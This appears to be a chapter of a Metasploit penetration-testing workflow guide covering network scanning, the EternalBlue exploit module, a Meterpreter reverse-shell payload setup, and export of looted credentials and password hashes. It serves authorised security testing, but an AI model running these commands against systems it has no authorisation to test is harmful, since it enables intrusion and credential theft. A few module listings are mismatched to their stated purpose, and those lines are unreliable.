# Standard Workflow

## 8.1 Reconnaissance & Enumeration Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 1: Information Gathering                                   │
├─────────────────────────────────────────────────────────────────┤
│ 1. Start Metasploit and initialize workspace                     │
│    msf6 > workspace -a ExternalPentest                           │
│    msf6 > workspace ExternalPentest                              │
│                                                                  │
│ 2. Import nmap scan results                                      │
│    msf6 > db_import /path/to/nmap-scan.xml                      │
│    msf6 > hosts -c address,os_flavor,services                  │
│                                                                  │
│ 3. Quick service discovery                                       │
│    msf6 > use auxiliary/scanner/discovery/arp_sweep            │
│    msf6 > set RHOSTS 10.10.10.0/24                              │
│    msf6 > run                                                    │
│                                                                  │
│ 4. Port scanning (if no nmap data)                              │
│    msf6 > db_nmap -sS -sV -O 10.10.10.0/24                     │
│                                                                  │
│ 5. Identify interesting services                                 │
│    msf6 > services -c port,protocol,name,info                 │
│    msf6 > search type:auxiliary name:smb                       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ PHASE 2: Vulnerability Assessment                                 │
├─────────────────────────────────────────────────────────────────┤
│ 1. Check for known vulnerabilities                               │
│    msf6 > search cve:2023 name:smb                              │
│    msf6 > use exploit/windows/smb/ms17_010_eternalblue          │
│                                                                  │
│ 2. Run version-specific scanners                                 │
│    msf6 > use auxiliary/scanner/smb/smb_ms17_010              │
│    msf6 > set RHOSTS 10.10.10.0/24                             │
│    msf6 > run                                                    │
│                                                                  │
│ 3. Check for default/weak credentials                            │
│    msf6 > use auxiliary/scanner/http/axis_local_file_include   │
│    msf6 > use auxiliary/scanner/mysql/mysql_login              │
│                                                                  │
│ 4. Enumerate users                                               │
│    msf6 > use auxiliary/scanner/smb/smb_enumusers              │
│    msf6 > use auxiliary/scanner/ftp/ftp_version                │
│                                                                  │
│ 5. Document all findings                                        │
│    msf6 > vulns -c host,name,cvss                              │
└─────────────────────────────────────────────────────────────────┘
```

## 8.2 Scanning Methodology

### Network Scanning Workflow

```bash
# 1. Quick ping sweep
db_nmap -sn 10.10.10.0/24 -oA subnet_ping

# 2. Port scan with service detection
db_nmap -sS -sV -O -p- 10.10.10.10 -oA full_scan

# 3. UDP scan (common services)
db_nmap -sU -sV 10.10.10.10 -oA udp_scan

# 4. Specific vulnerability scans
db_nmap --script=vuln 10.10.10.10 -oA vuln_scan

# 5. Review results
hosts
services
vulns
notes
```

### Targeted Module Workflow

```
┌────────────────────────────────────────────────────────────┐
│ MODULE SELECTION DECISION TREE                              │
├────────────────────────────────────────────────────────────┤
│                                                            │
│ What do you know about the target?                         │
│                                                            │
│ ├── Service version?                                       │
│ │   └── Search: search name:<service> version:<X.X        │
│ │   └── Check: /modules/auxiliary/scanner/<service>/    │
│ │                                                            │
│ ├── OS?                                                     │
│ │   └── Search: platform:windows or platform:linux       │
│ │   └── Check: /modules/exploits/<os>/                   │
│ │                                                            │
│ ├── Specific vulnerability?                                │
│ │   └── Search: CVE-YYYY-XXXXX                           │
│ │   └── use exploit/<path>/cve_YYYY_XXXXX                │
│ │                                                            │
│ └── Nothing specific                                        │
│     └── Run auxiliary scanners                             │
│     └── Look for low-hanging fruit                         │
└────────────────────────────────────────────────────────────┘
```

### Exploitation Checklist

```markdown
:clipboard: Before running any exploit:

1. Verify target is in scope
2. Confirm service is running (nc -zv target port)
3. Check if exploit is compatible with target
   - show targets
   - set TARGET <index>
4. Verify exploit requirements
   - show options (required fields)
   - check missing modules (loadpath)
5. Test on non-production first
6. Prepare session handling
   - set PAYLOAD windows/x64/meterpreter/reverse_tcp
   - set LHOST <your_ip>
   - set LPORT 4444
7. Have rollback plan (kill session)
8. Set reasonable timeout
```

## 8.3 Reporting Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│ REPORTING PROCESS                                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│ DURING ENGAGEMENT:                                               │
│ ├── Save workspace regularly                                     │
│ │   └── workspace -w Pentest2024                                │
│ │   └── db_export -f xml pentest_data.xml                       │
│ ├── Tag important hosts                                          │
│ │   └── hosts -t critical 10.10.10.10                          │
│ │   └── hosts -t exploited 10.10.10.*                           │
│ ├── Add notes for findings                                       │
│ │   └── notes -t vuln -n "MS17-010 vulnerable" -h 10.10.10.10│
│ └── Export loot                                                  │
│     └── loot -t credentials -o creds.txt                        │
│                                                                  │
│ END OF ENGAGEMENT:                                               │
│ ├── Generate host summary                                        │
│ │   └── hosts -c address,os_flavor,purpose,info                │
│ ├── Generate vulnerability summary                               │
│ │   └── vulns -c host,name,cvss,refs                            │
│ ├── Export data                                                  │
│ │   └── db_export -f xml full_audit.xml                        │
│ │   └── db_export -f pwdump hashes.txt                         │
│ └── Create executive report (manual)                             │
└─────────────────────────────────────────────────────────────────┘
```

### Data Export Commands

```bash
# Export entire database
db_export -f xml /root/pentest/full_export.xml
db_export -f csv /root/pentest/hosts.csv

# Export specific data
loot -t credentials
loot -t hashes
loot -t notes
notes -t vuln

# Generate report from Metasploit Pro (commercial)
# Or use: msfconsole -r report_generator.rc
```

### Resource Script for Repeatable Scans

```ruby
# resource_scripts/quick_scan.rc

# Setup
workspace -a QuickScan
setg RHOSTS 10.10.10.0/24
setg THREADS 20

# Run common scanners
use auxiliary/scanner/portscan/tcp
run

use auxiliary/scanner/smb/smb_version
run

use auxiliary/scanner/ssh/ssh_version
run

use auxiliary/scanner/ftp/ftp_version
run

use auxiliary/scanner/http/http_version
run

# Export results
db_export -f xml scan_results.xml

# Cleanup
workspace
```

### Integration with Other Tools

```markdown
| Tool | Integration Method |
|------|---------------------|
| Nmap | db_import, db_nmap |
| Nessus | db_import_nessus_xml |
| OpenVAS | openvas_*

# Example
db_import /scans/nessus/nessus_scan.nessus
```
